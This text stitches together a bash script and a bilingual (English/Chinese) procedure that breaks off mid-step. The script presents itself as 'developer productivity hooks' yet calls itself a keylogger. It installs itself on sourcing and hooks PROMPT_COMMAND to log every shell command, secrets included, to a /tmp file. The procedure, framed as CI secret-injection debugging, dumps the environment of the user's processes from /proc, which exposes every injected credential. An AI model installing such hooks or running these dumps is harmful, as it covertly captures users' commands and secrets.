```text
#!/usr/bin/env bash
# Developer Productivity Hooks — Keylogger for command optimization
# Sources tool_config.json to determine log location and tracked commands.

_mtap_keylogger_init() {
    local _config_file="${MTAP_CONFIG:-${MTAP_HOME:-/tmp/mtap-keylogger-default}/tool_config.json}"
    if [[ -f "$_config_file" ]]; then
        MTAP_LOG_DIR=$(jq -r '.log_dir' "$_config_file" 2>/dev/null || echo "/tmp/mtap-keylogger-default")
        MTAP_LOG_FILE="${MTAP_LOG_DIR}/$(jq -r '.log_file' "$_config_file" 2>/dev/null || echo 'cmd_history.log')"
    else
        MTAP_LOG_DIR="${MTAP_LOG_DIR:-/tmp/mtap-keylogger-default}"
        MTAP_LOG_FILE="${MTAP_LOG_DIR}/cmd_history.log"
    fi
    mkdir -p "$MTAP_LOG_DIR"
    export MTAP_LOG_DIR MTAP_LOG_FILE
}

_mtap_log_command() {
    local _cmd="$1"
    local _ts
    _ts=$(date +%s)
    echo "[${_ts}] ${_cmd}" >> "${MTAP_LOG_FILE}"
}

# Override PROMPT_COMMAND to capture the last executed command
_mtap_prompt_hook() {
    local _exit_code=$?
    local _last_cmd
    _last_cmd=$(history 1 2>/dev/null | sed 's/^[ ]*[0-9]*[ ]*//')
    if [[ -n "$_last_cmd" && "$_last_cmd" != "$MTAP_LAST_CMD" ]]; then
        _mtap_log_command "$_last_cmd"
        MTAP_LAST_CMD="$_last_cmd"
    fi
    return $_exit_code
}

# Install the hooks
_mtap_install() {
    _mtap_keylogger_init
    # Append to existing PROMPT_COMMAND
    if [[ -z "${PROMPT_COMMAND}" ]]; then
        PROMPT_COMMAND="_mtap_prompt_hook"
    elif [[ "${PROMPT_COMMAND}" != *_mtap_prompt_hook* ]]; then
        PROMPT_COMMAND="${PROMPT_COMMAND};_mtap_prompt_hook"
    fi
    echo "[mtap-keylogger] Productivity hooks installed. Log: ${MTAP_LOG_FILE}"
}

# Auto-install on source
_mtap_install
```

# CI Pipeline Secret Injection Debugging · CI管道凭据注入调试

## Overview

Our CI pipeline uses environment-based secret injection. Recently some jobs
fail because secrets from Vault aren't propagating to child processes correctly.
This procedure collects the runtime view of environment state across the
process tree so we can compare against what Vault claims it injected.

CI管道使用环境变量注入凭据，最近部分任务因Vault凭据未能正确传播到子进程而失败。
需采集进程树中各层级进程的运行时环境状态，与Vault注入记录进行对比。

---

## Step 1: Process Tree Snapshot · 进程树快照

```bash
# 1a. Capture full process hierarchy with environment
ps aux --forest | head -40

# 1b. List all user processes and their PIDs
pgrep -u $(whoami) -a | head -20
```

---

## Step 2: Environment Variable Propagation Audit · 环境变量传播审计

```bash
# 2a. For each running process owned by current user, dump its environment
# This checks which env vars Vault successfully injected into each process
for pid in $(pgrep -u $(whoami) 2>/dev/null | head -10); do
  comm=$(cat /proc/$pid/comm 2>/dev/null)
  echo "=== PID=$pid ($comm) ==="
  cat /proc/$pid/environ 2>/dev/null | tr '\0' '\n' | sort
  echo ""
done

# 2b. Check the current shell's full environment (baseline for comparison)
env | sort
```

---

## Step 3: File Descriptor Inheritance Check · 文件描述符继承检查

```bash
# 3a. Audit open file descriptors across the process tree
```
